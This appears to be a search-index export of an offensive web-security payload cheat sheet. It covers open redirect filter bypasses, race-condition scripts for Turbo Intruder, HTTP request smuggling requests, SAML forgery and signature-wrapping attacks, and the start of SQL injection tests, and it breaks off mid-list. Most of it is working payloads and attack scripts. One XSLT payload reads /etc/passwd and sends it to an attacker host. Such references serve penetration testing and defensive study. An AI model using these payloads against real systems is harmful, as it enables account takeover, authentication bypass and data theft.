www.whitelisted.com.evil.com redirect to evil.com Using CRLF to bypass \"javascript\" blacklisted keyword java%0d%0ascript%0d%0a:alert(0) Using \"//\" & \"////\" to bypass \"http\" blacklisted keyword //google.com ////google.com Using \"https:\" to bypass \"//\" blacklisted keyword https:google.com Using \"\\/\\/\" to bypass \"//\" blacklisted keyword (Browsers see \\/\\/ as //) \\/\\/google.com/ /\\/google.com/ Using \"%E3%80%82\" to bypass \".\" blacklisted character /?redir=google\u3002com //google%E3%80%82com Using null byte \"%00\" to bypass blacklist filter //google%00.com Using parameter pollution ?next=whitelisted.com&next=google.com Using \"@\" character, browser will redirect to anything after the \"@\" http://www.theirsite.com@yoursite.com/ Creating folder as their domain http://www.yoursite.com/http://www.theirsite.com/ http://www.yoursite.com/folder/www.folder.com Using \"?\" characted, browser will translate it to \"/?\" http://www.yoursite.com?http://www.theirsite.com/ http://www.yoursite.com?folder/www.folder.com Host/Split Unicode Normalization https://evil.c\u2100.example.com . ---> https://evil.ca/c.example.com http://a.com\uff0fX.b.com XSS from Open URL - If it's in a JS variable \";alert(0);// XSS from data:// wrapper http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg== XSS from javascript:// wrapper http://www.example.com/redirect.php?url=javascript:prompt(1)","title":"Filter Bypass"},{"location":"Open%20Redirect/#common-injection-parameters","text":"/{payload} ?next={payload} ?url={payload} ?target={payload} ?rurl={payload} ?dest={payload} ?destination={payload} ?redir={payload} ?redirect_uri={payload} ?redirect_url={payload} ?redirect={payload} /redirect/{payload} /cgi-bin/redirect.cgi?{payload} /out/{payload} /out?{payload} ?view={payload} /login?to={payload} ?image_url={payload} ?go={payload} ?return={payload} ?returnTo={payload} ?return_to={payload} ?checkout_url={payload} ?continue={payload} ?return_path={payload}","title":"Common injection parameters"},{"location":"Open%20Redirect/#references","text":"filedescriptor You do not need to run 80 reconnaissance tools to get access to user accounts - @stefanocoding OWASP - Unvalidated Redirects and Forwards Cheat Sheet Cujanovic - Open-Redirect-Payloads Pentester Land - Open Redirect Cheat Sheet Open Redirect Vulnerability - AUGUST 15, 2018 - s0cket7 Host/Split Exploitable Antipatterns in Unicode Normalization - BlackHat US 2019","title":"References"},{"location":"Race%20Condition/","text":"Race Condition Race conditions may occur when a process is critically or unexpectedly dependent on the sequence or timings of other events. In a web application environment, where multiple requests can be processed at a given time, developers may leave concurrency to be handled by the framework, server, or programming language. Summary Race Condition Summary Tools Turbo Intruder Examples Turbo Intruder 2 Requests Examples References Tools Turbo Intruder - a Burp Suite extension for sending large numbers of HTTP requests and analyzing the results. Turbo Intruder Examples Send request to turbo intruder Use this python code as a payload of the turbo intruder ```python def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=30, pipeline=False ) for i in range(30): engine.queue(target.req, i) engine.queue(target.req, target.baseInput, gate='race1') engine.start(timeout=5) engine.openGate('race1') engine.complete(timeout=60) def handleResponse(req, interesting): table.add(req) ``` 3. Now set the external HTTP header x-request: %s - :warning: This is needed by the turbo intruder 4. Click \"Attack\" Turbo Intruder 2 Requests Examples This following template can use when use have to send race condition of request2 immediately after send a request1 when the window may only be a few milliseconds. def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100, pipeline=False ) request1 = ''' POST /target-URI-1 HTTP/1.1 Host: <REDACTED> Cookie: session=<REDACTED> parameterName=parameterValue ''' request2 = ''' GET /target-URI-2 HTTP/1.1 Host: <REDACTED> Cookie: session=<REDACTED> ''' engine.queue(request1, gate='race1') for i in range(30): engine.queue(request2, gate='race1') engine.openGate('race1') engine.complete(timeout=60) def handleResponse(req, interesting): table.add(req) References Race Condition allows to redeem multiple times gift cards which leads to free \"money\" - @muon4 Turbo Intruder: Embracing the billion-request attack - James Kettle | 25 January 2019 Race Condition Bug In Web App: A Use Case - Mandeep Jadon","title":"Race Condition"},{"location":"Race%20Condition/#race-condition","text":"Race conditions may occur when a process is critically or unexpectedly dependent on the sequence or timings of other events. In a web application environment, where multiple requests can be processed at a given time, developers may leave concurrency to be handled by the framework, server, or programming language.","title":"Race Condition"},{"location":"Race%20Condition/#summary","text":"Race Condition Summary Tools Turbo Intruder Examples Turbo Intruder 2 Requests Examples References","title":"Summary"},{"location":"Race%20Condition/#tools","text":"Turbo Intruder - a Burp Suite extension for sending large numbers of HTTP requests and analyzing the results.","title":"Tools"},{"location":"Race%20Condition/#turbo-intruder-examples","text":"Send request to turbo intruder Use this python code as a payload of the turbo intruder ```python def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=30, pipeline=False ) for i in range(30): engine.queue(target.req, i) engine.queue(target.req, target.baseInput, gate='race1') engine.start(timeout=5) engine.openGate('race1') engine.complete(timeout=60) def handleResponse(req, interesting): table.add(req) ``` 3. Now set the external HTTP header x-request: %s - :warning: This is needed by the turbo intruder 4. Click \"Attack\"","title":"Turbo Intruder Examples"},{"location":"Race%20Condition/#turbo-intruder-2-requests-examples","text":"This following template can use when use have to send race condition of request2 immediately after send a request1 when the window may only be a few milliseconds. def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100, pipeline=False ) request1 = ''' POST /target-URI-1 HTTP/1.1 Host: <REDACTED> Cookie: session=<REDACTED> parameterName=parameterValue ''' request2 = ''' GET /target-URI-2 HTTP/1.1 Host: <REDACTED> Cookie: session=<REDACTED> ''' engine.queue(request1, gate='race1') for i in range(30): engine.queue(request2, gate='race1') engine.openGate('race1') engine.complete(timeout=60) def handleResponse(req, interesting): table.add(req)","title":"Turbo Intruder 2 Requests Examples"},{"location":"Race%20Condition/#references","text":"Race Condition allows to redeem multiple times gift cards which leads to free \"money\" - @muon4 Turbo Intruder: Embracing the billion-request attack - James Kettle | 25 January 2019 Race Condition Bug In Web App: A Use Case - Mandeep Jadon","title":"References"},{"location":"Request%20Smuggling/","text":"Request Smuggling Summary Tools CL.TE vulnerabilities TE.CL vulnerabilities TE.TE behavior: obfuscating the TE header References Tools HTTP Request Smuggler / BApp Store Smuggler CL.TE vulnerabilities The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header. POST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 13 Transfer-Encoding: chunked 0 SMUGGLED Example: POST / HTTP/1.1 Host: domain.example.com Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G Challenge: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te TE.CL vulnerabilities The front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. POST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 3 Transfer-Encoding: chunked 8 SMUGGLED 0 Example: POST / HTTP/1.1 Host: domain.example.com User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Content-Length: 4 Connection: close Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 :warning: To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the \"Update Content-Length\" option is unchecked.You need to include the trailing sequence \\r\\n\\r\\n following the final 0. Challenge: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl TE.TE behavior: obfuscating the TE header The front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way. Transfer-Encoding: xchunked Transfer-Encoding : chunked Transfer-Encoding: chunked Transfer-Encoding: x Transfer-Encoding:[tab]chunked [space]Transfer-Encoding: chunked X: X[\\n]Transfer-Encoding: chunked Transfer-Encoding : chunked Challenge: https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header References PortSwigger - Request Smuggling Tutorial and PortSwigger - Request Smuggling Reborn A Pentester's Guide to HTTP Request Smuggling - Busra Demir - 2020, October 16","title":"Request Smuggling"},{"location":"Request%20Smuggling/#request-smuggling","text":"","title":"Request Smuggling"},{"location":"Request%20Smuggling/#summary","text":"Tools CL.TE vulnerabilities TE.CL vulnerabilities TE.TE behavior: obfuscating the TE header References","title":"Summary"},{"location":"Request%20Smuggling/#tools","text":"HTTP Request Smuggler / BApp Store Smuggler","title":"Tools"},{"location":"Request%20Smuggling/#clte-vulnerabilities","text":"The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header. POST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 13 Transfer-Encoding: chunked 0 SMUGGLED Example: POST / HTTP/1.1 Host: domain.example.com Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G Challenge: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te","title":"CL.TE vulnerabilities"},{"location":"Request%20Smuggling/#tecl-vulnerabilities","text":"The front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. POST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 3 Transfer-Encoding: chunked 8 SMUGGLED 0 Example: POST / HTTP/1.1 Host: domain.example.com User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Content-Length: 4 Connection: close Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 :warning: To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the \"Update Content-Length\" option is unchecked.You need to include the trailing sequence \\r\\n\\r\\n following the final 0. Challenge: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl","title":"TE.CL vulnerabilities"},{"location":"Request%20Smuggling/#tete-behavior-obfuscating-the-te-header","text":"The front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way. Transfer-Encoding: xchunked Transfer-Encoding : chunked Transfer-Encoding: chunked Transfer-Encoding: x Transfer-Encoding:[tab]chunked [space]Transfer-Encoding: chunked X: X[\\n]Transfer-Encoding: chunked Transfer-Encoding : chunked Challenge: https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header","title":"TE.TE behavior: obfuscating the TE header"},{"location":"Request%20Smuggling/#references","text":"PortSwigger - Request Smuggling Tutorial and PortSwigger - Request Smuggling Reborn A Pentester's Guide to HTTP Request Smuggling - Busra Demir - 2020, October 16","title":"References"},{"location":"SAML%20Injection/","text":"SAML Injection Security Assertion Markup Language (SAML) is an open standard that allows security credentials to be shared by multiple computers across a network. When using SAML-based Single Sign-On (SSO), three distinct parties are involved. There is a user (the so-called principal), an IDentity Provider (IDP), and a cloud application Service Provider (SP). - centrify Summary Tools Authentication Bypass Invalid Signature Signature Stripping XML Signature Wrapping Attacks XML Comment Handling XML External Entity Extensible Stylesheet Language Transformation Tools SAML Raider - Burp Extension SAML Support - ZAP Addon Authentication Bypass A SAML Response should contain the <samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" . Invalid Signature Signatures which are not signed by a real CA are prone to cloning. Ensure the signature is signed by a real CA. If the certificate is self-signed, you may be able to clone the certificate or create your own self-signed certificate to replace it. Signature Stripping [...]accepting unsigned SAML assertions is accepting a username without checking the password - @ilektrojohn The goal is to forge a well formed SAML Assertion without signing it. For some default configurations if the signature section is omitted from a SAML response, then no signature verification is performed. Example of SAML assertion where NameID=admin without signature. <?xml version=\"1.0\" encoding=\"UTF-8\"?> <saml2p:Response xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\" Destination=\"http://localhost:7001/saml2/sp/acs/post\" ID=\"id39453084082248801717742013\" IssueInstant=\"2018-04-22T10:28:53.593Z\" Version=\"2.0\"> <saml2:Issuer xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" Format=\"urn:oasis:names:tc:SAML:2.0:nameidformat:entity\">REDACTED</saml2:Issuer> <saml2p:Status xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\"> <saml2p:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\" /> </saml2p:Status> <saml2:Assertion xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"id3945308408248426654986295\" IssueInstant=\"2018-04-22T10:28:53.593Z\" Version=\"2.0\"> <saml2:Issuer Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:entity\" xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">REDACTED</saml2:Issuer> <saml2:Subject xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\"> <saml2:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified\">admin</saml2:NameID> <saml2:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"> <saml2:SubjectConfirmationData NotOnOrAfter=\"2018-04-22T10:33:53.593Z\" Recipient=\"http://localhost:7001/saml2/sp/acs/post\" /> </saml2:SubjectConfirmation> </saml2:Subject> <saml2:Conditions NotBefore=\"2018-04-22T10:23:53.593Z\" NotOnOrAfter=\"2018-0422T10:33:53.593Z\" xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\"> <saml2:AudienceRestriction> <saml2:Audience>WLS_SP</saml2:Audience> </saml2:AudienceRestriction> </saml2:Conditions> <saml2:AuthnStatement AuthnInstant=\"2018-04-22T10:28:49.876Z\" SessionIndex=\"id1524392933593.694282512\" xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\"> <saml2:AuthnContext> <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef> </saml2:AuthnContext> </saml2:AuthnStatement> </saml2:Assertion> </saml2p:Response> XML Signature Wrapping Attacks XML Signature Wrapping (XSW) attack, some implementations check for a valid signature and match it to a valid assertion, but do not check for multiple assertions, multiple signatures, or behave differently depending on the order of assertions. XSW1 \u2013 Applies to SAML Response messages. Add a cloned unsigned copy of the Response after the existing signature. XSW2 \u2013 Applies to SAML Response messages. Add a cloned unsigned copy of the Response before the existing signature. XSW3 \u2013 Applies to SAML Assertion messages. Add a cloned unsigned copy of the Assertion before the existing Assertion. XSW4 \u2013 Applies to SAML Assertion messages. Add a cloned unsigned copy of the Assertion within the existing Assertion. XSW5 \u2013 Applies to SAML Assertion messages. Change a value in the signed copy of the Assertion and adds a copy of the original Assertion with the signature removed at the end of the SAML message. XSW6 \u2013 Applies to SAML Assertion messages. Change a value in the signed copy of the Assertion and adds a copy of the original Assertion with the signature removed after the original signature. XSW7 \u2013 Applies to SAML Assertion messages. Add an \u201cExtensions\u201d block with a cloned unsigned assertion. XSW8 \u2013 Applies to SAML Assertion messages. Add an \u201cObject\u201d block containing a copy of the original assertion with the signature removed. In the following example, these terms are used. FA: Forged Assertion LA: Legitimate Assertion LAS: Signature of the Legitimate Assertion <SAMLResponse> <FA ID=\"evil\"> <Subject>Attacker</Subject> </FA> <LA ID=\"legitimate\"> <Subject>Legitimate User</Subject> <LAS> <Reference Reference URI=\"legitimate\"> </Reference> </LAS> </LA> </SAMLResponse> In the Github Enterprise vulnerability, this request would verify and create a sessions for Attacker instead of Legitimate User , even if FA is not signed. XML Comment Handling A threat actor who already has authenticated access into a SSO system can authenticate as another user without that individual\u2019s SSO password. This vulnerability has multiple CVE in the following libraries and products. OneLogin - python-saml - CVE-2017-11427 OneLogin - ruby-saml - CVE-2017-11428 Clever - saml2-js - CVE-2017-11429 OmniAuth-SAML - CVE-2017-11430 Shibboleth - CVE-2018-0489 Duo Network Gateway - CVE-2018-7340 Researchers have noticed that if an attacker inserts a comment inside the username field in such a way that it breaks the username, the attacker might gain access to a legitimate user's account. <SAMLResponse> <Issuer>https://idp.com/</Issuer> <Assertion ID=\"_id1234\"> <Subject> <NameID>user@user.com<!--XMLCOMMENT-->.evil.com</NameID> Where user@user.com is the first part of the username, and .evil.com is the second. XML External Entity An alternative exploitation would use XML entities to bypass the signature verification, since the content will not change, except during XML parsing. In the following example: - &s; will resolve to the string \"s\" - &f1; will resolve to the string \"f1\" <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE Response [ <!ENTITY s \"s\"> <!ENTITY f1 \"f1\"> ]> <saml2p:Response xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\" Destination=\"https://idptestbed/Shibboleth.sso/SAML2/POST\" ID=\"_04cfe67e596b7449d05755049ba9ec28\" InResponseTo=\"_dbbb85ce7ff81905a3a7b4484afb3a4b\" IssueInstant=\"2017-12-08T15:15:56.062Z\" Version=\"2.0\"> [...] <saml2:Attribute FriendlyName=\"uid\" Name=\"urn:oid:0.9.2342.19200300.100.1.1\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"> <saml2:AttributeValue> &s;taf&f1; </saml2:AttributeValue> </saml2:Attribute> [...] </saml2p:Response> The SAML response is accepted by the service provider. Due to the vulnerability, the service provider application reports \"taf\" as the value of the \"uid\" attribute. Extensible Stylesheet Language Transformation An XSLT can be carried out by using the transform element. Picture from http://sso-attacks.org/XSLT_Attack <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"> ... <ds:Transforms> <ds:Transform> <xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"> <xsl:template match=\"doc\"> <xsl:variable name=\"file\" select=\"unparsed-text('/etc/passwd')\"/> <xsl:variable name=\"escaped\" select=\"encode-for-uri($file)\"/> <xsl:variable name=\"attackerUrl\" select=\"'http://attacker.com/'\"/> <xsl:variable name=\"exploitUrl\"select=\"concat($attackerUrl,$escaped)\"/> <xsl:value-of select=\"unparsed-text($exploitUrl)\"/> </xsl:template> </xsl:stylesheet> </ds:Transform> </ds:Transforms> ... </ds:Signature> References SAML Burp Extension - ROLAND BISCHOFBERGER - JULY 24, 2015 The road to your codebase is paved with forged assertions - @ilektrojohn - March 13, 2017 SAML_Security_Cheat_Sheet.md - OWASP On Breaking SAML: Be Whoever You Want to Be - Juraj Somorovsky, Andreas Mayer, Jorg Schwenk, Marco Kampmann, and Meiko Jensen Making Headlines: SAML - March 19, 2018 - Torsten George Vulnerability Note VU#475445 - 2018-02-27 - Carnegie Mellon University ORACLE WEBLOGIC - MULTIPLE SAML VULNERABILITIES (CVE-2018-2998/CVE-2018-2933) - Denis Andzakovic - Jul 18, 2018 Truncation of SAML Attributes in Shibboleth 2 - 2018-01-15 - redteam-pentesting.de Attacking SSO: Common SAML Vulnerabilities and Ways to Find Them - March 7th, 2017 - Jem Jensen How to Hunt Bugs in SAML; a Methodology - Part I - @epi052 How to Hunt Bugs in SAML; a Methodology - Part II - @epi052 How to Hunt Bugs in SAML; a Methodology - Part III - @epi052","title":"SAML Injection"},{"location":"SAML%20Injection/#saml-injection","text":"Security Assertion Markup Language (SAML) is an open standard that allows security credentials to be shared by multiple computers across a network. When using SAML-based Single Sign-On (SSO), three distinct parties are involved. There is a user (the so-called principal), an IDentity Provider (IDP), and a cloud application Service Provider (SP). - centrify","title":"SAML Injection"},{"location":"SAML%20Injection/#summary","text":"Tools Authentication Bypass Invalid Signature Signature Stripping XML Signature Wrapping Attacks XML Comment Handling XML External Entity Extensible Stylesheet Language Transformation","title":"Summary"},{"location":"SAML%20Injection/#tools","text":"SAML Raider - Burp Extension SAML Support - ZAP Addon","title":"Tools"},{"location":"SAML%20Injection/#authentication-bypass","text":"A SAML Response should contain the <samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" .","title":"Authentication Bypass"},{"location":"SAML%20Injection/#invalid-signature","text":"Signatures which are not signed by a real CA are prone to cloning. Ensure the signature is signed by a real CA. If the certificate is self-signed, you may be able to clone the certificate or create your own self-signed certificate to replace it.","title":"Invalid Signature"},{"location":"SAML%20Injection/#signature-stripping","text":"[...]accepting unsigned SAML assertions is accepting a username without checking the password - @ilektrojohn The goal is to forge a well formed SAML Assertion without signing it. For some default configurations if the signature section is omitted from a SAML response, then no signature verification is performed. Example of SAML assertion where NameID=admin without signature. <?xml version=\"1.0\" encoding=\"UTF-8\"?> <saml2p:Response xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\" Destination=\"http://localhost:7001/saml2/sp/acs/post\" ID=\"id39453084082248801717742013\" IssueInstant=\"2018-04-22T10:28:53.593Z\" Version=\"2.0\"> <saml2:Issuer xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" Format=\"urn:oasis:names:tc:SAML:2.0:nameidformat:entity\">REDACTED</saml2:Issuer> <saml2p:Status xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\"> <saml2p:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\" /> </saml2p:Status> <saml2:Assertion xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"id3945308408248426654986295\" IssueInstant=\"2018-04-22T10:28:53.593Z\" Version=\"2.0\"> <saml2:Issuer Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:entity\" xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">REDACTED</saml2:Issuer> <saml2:Subject xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\"> <saml2:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified\">admin</saml2:NameID> <saml2:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"> <saml2:SubjectConfirmationData NotOnOrAfter=\"2018-04-22T10:33:53.593Z\" Recipient=\"http://localhost:7001/saml2/sp/acs/post\" /> </saml2:SubjectConfirmation> </saml2:Subject> <saml2:Conditions NotBefore=\"2018-04-22T10:23:53.593Z\" NotOnOrAfter=\"2018-0422T10:33:53.593Z\" xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\"> <saml2:AudienceRestriction> <saml2:Audience>WLS_SP</saml2:Audience> </saml2:AudienceRestriction> </saml2:Conditions> <saml2:AuthnStatement AuthnInstant=\"2018-04-22T10:28:49.876Z\" SessionIndex=\"id1524392933593.694282512\" xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\"> <saml2:AuthnContext> <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef> </saml2:AuthnContext> </saml2:AuthnStatement> </saml2:Assertion> </saml2p:Response>","title":"Signature Stripping"},{"location":"SAML%20Injection/#xml-signature-wrapping-attacks","text":"XML Signature Wrapping (XSW) attack, some implementations check for a valid signature and match it to a valid assertion, but do not check for multiple assertions, multiple signatures, or behave differently depending on the order of assertions. XSW1 \u2013 Applies to SAML Response messages. Add a cloned unsigned copy of the Response after the existing signature. XSW2 \u2013 Applies to SAML Response messages. Add a cloned unsigned copy of the Response before the existing signature. XSW3 \u2013 Applies to SAML Assertion messages. Add a cloned unsigned copy of the Assertion before the existing Assertion. XSW4 \u2013 Applies to SAML Assertion messages. Add a cloned unsigned copy of the Assertion within the existing Assertion. XSW5 \u2013 Applies to SAML Assertion messages. Change a value in the signed copy of the Assertion and adds a copy of the original Assertion with the signature removed at the end of the SAML message. XSW6 \u2013 Applies to SAML Assertion messages. Change a value in the signed copy of the Assertion and adds a copy of the original Assertion with the signature removed after the original signature. XSW7 \u2013 Applies to SAML Assertion messages. Add an \u201cExtensions\u201d block with a cloned unsigned assertion. XSW8 \u2013 Applies to SAML Assertion messages. Add an \u201cObject\u201d block containing a copy of the original assertion with the signature removed. In the following example, these terms are used. FA: Forged Assertion LA: Legitimate Assertion LAS: Signature of the Legitimate Assertion <SAMLResponse> <FA ID=\"evil\"> <Subject>Attacker</Subject> </FA> <LA ID=\"legitimate\"> <Subject>Legitimate User</Subject> <LAS> <Reference Reference URI=\"legitimate\"> </Reference> </LAS> </LA> </SAMLResponse> In the Github Enterprise vulnerability, this request would verify and create a sessions for Attacker instead of Legitimate User , even if FA is not signed.","title":"XML Signature Wrapping Attacks"},{"location":"SAML%20Injection/#xml-comment-handling","text":"A threat actor who already has authenticated access into a SSO system can authenticate as another user without that individual\u2019s SSO password. This vulnerability has multiple CVE in the following libraries and products. OneLogin - python-saml - CVE-2017-11427 OneLogin - ruby-saml - CVE-2017-11428 Clever - saml2-js - CVE-2017-11429 OmniAuth-SAML - CVE-2017-11430 Shibboleth - CVE-2018-0489 Duo Network Gateway - CVE-2018-7340 Researchers have noticed that if an attacker inserts a comment inside the username field in such a way that it breaks the username, the attacker might gain access to a legitimate user's account. <SAMLResponse> <Issuer>https://idp.com/</Issuer> <Assertion ID=\"_id1234\"> <Subject> <NameID>user@user.com<!--XMLCOMMENT-->.evil.com</NameID> Where user@user.com is the first part of the username, and .evil.com is the second.","title":"XML Comment Handling"},{"location":"SAML%20Injection/#xml-external-entity","text":"An alternative exploitation would use XML entities to bypass the signature verification, since the content will not change, except during XML parsing. In the following example: - &s; will resolve to the string \"s\" - &f1; will resolve to the string \"f1\" <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE Response [ <!ENTITY s \"s\"> <!ENTITY f1 \"f1\"> ]> <saml2p:Response xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\" Destination=\"https://idptestbed/Shibboleth.sso/SAML2/POST\" ID=\"_04cfe67e596b7449d05755049ba9ec28\" InResponseTo=\"_dbbb85ce7ff81905a3a7b4484afb3a4b\" IssueInstant=\"2017-12-08T15:15:56.062Z\" Version=\"2.0\"> [...] <saml2:Attribute FriendlyName=\"uid\" Name=\"urn:oid:0.9.2342.19200300.100.1.1\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"> <saml2:AttributeValue> &s;taf&f1; </saml2:AttributeValue> </saml2:Attribute> [...] </saml2p:Response> The SAML response is accepted by the service provider. Due to the vulnerability, the service provider application reports \"taf\" as the value of the \"uid\" attribute.","title":"XML External Entity"},{"location":"SAML%20Injection/#extensible-stylesheet-language-transformation","text":"An XSLT can be carried out by using the transform element. Picture from http://sso-attacks.org/XSLT_Attack <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"> ... <ds:Transforms> <ds:Transform> <xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"> <xsl:template match=\"doc\"> <xsl:variable name=\"file\" select=\"unparsed-text('/etc/passwd')\"/> <xsl:variable name=\"escaped\" select=\"encode-for-uri($file)\"/> <xsl:variable name=\"attackerUrl\" select=\"'http://attacker.com/'\"/> <xsl:variable name=\"exploitUrl\"select=\"concat($attackerUrl,$escaped)\"/> <xsl:value-of select=\"unparsed-text($exploitUrl)\"/> </xsl:template> </xsl:stylesheet> </ds:Transform> </ds:Transforms> ... </ds:Signature>","title":"Extensible Stylesheet Language Transformation"},{"location":"SAML%20Injection/#references","text":"SAML Burp Extension - ROLAND BISCHOFBERGER - JULY 24, 2015 The road to your codebase is paved with forged assertions - @ilektrojohn - March 13, 2017 SAML_Security_Cheat_Sheet.md - OWASP On Breaking SAML: Be Whoever You Want to Be - Juraj Somorovsky, Andreas Mayer, Jorg Schwenk, Marco Kampmann, and Meiko Jensen Making Headlines: SAML - March 19, 2018 - Torsten George Vulnerability Note VU#475445 - 2018-02-27 - Carnegie Mellon University ORACLE WEBLOGIC - MULTIPLE SAML VULNERABILITIES (CVE-2018-2998/CVE-2018-2933) - Denis Andzakovic - Jul 18, 2018 Truncation of SAML Attributes in Shibboleth 2 - 2018-01-15 - redteam-pentesting.de Attacking SSO: Common SAML Vulnerabilities and Ways to Find Them - March 7th, 2017 - Jem Jensen How to Hunt Bugs in SAML; a Methodology - Part I - @epi052 How to Hunt Bugs in SAML; a Methodology - Part II - @epi052 How to Hunt Bugs in SAML; a Methodology - Part III - @epi052","title":"References"},{"location":"SQL%20Injection/","text":"SQL injection A SQL injection attack consists of insertion or \"injection\" of a SQL query via the input data from the client to the application. Attempting to manipulate SQL queries may have goals including: - Information Leakage - Disclosure of stored data - Manipulation of stored data - Bypassing authorization controls Summary CheatSheet MSSQL Injection CheatSheet MySQL Injection CheatSheet OracleSQL Injection CheatSheet PostgreSQL Injection CheatSheet SQLite Injection CheatSheet Cassandra Injection Entry point detection DBMS Identification SQL injection using SQLmap Basic arguments for SQLmap Load a request file and use mobile user-agent Custom injection in UserAgent/Header/Referer/Cookie Second order injection Shell Crawl a website with SQLmap and auto-exploit Using TOR with SQLmap Using a proxy with SQLmap Using Chrome cookie and a Proxy Using suffix to tamper the injection General tamper option and tamper's list SQLmap without SQL injection Authentication bypass Authentication Bypass (Raw MD5 SHA1) Polyglot injection Routed injection Insert Statement - ON DUPLICATE KEY UPDATE WAF Bypass Entry point detection Detection of an SQL injection entry point Simple characters ' %27 \" %22 # %23 ; %3B ) Wildcard (*) &apos; # required for XML content Multiple encoding %%2727 %25%27 Merging characters `+HERP '||'DERP '+'herp ' 'DERP '%20'HERP '%2B'HERP Logic Testing page.asp?id=1 or 1=1 -- true page.asp?id=1' or 1=1 -- true page.asp?id=1\" or 1=1 -- true page.asp?id=1 and 1=2 -- false Weird characters Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was transformed into U+0022 QUOTATION MARK (\") Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was transformed into U+0027 APOSTROPHE (') DBMS Identification [\"conv('a',16,2)=conv('a',16,2)\" ,\"MYSQL\"], [\"connection_id()=connection_id()\" ,\"MYSQL\"], [\"crc32('MySQL')=crc32('MySQL')\" ,\"MYSQL\"], [\"BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)\" ,\"MSSQL\"], [\"@@CONNECTIONS>0\" 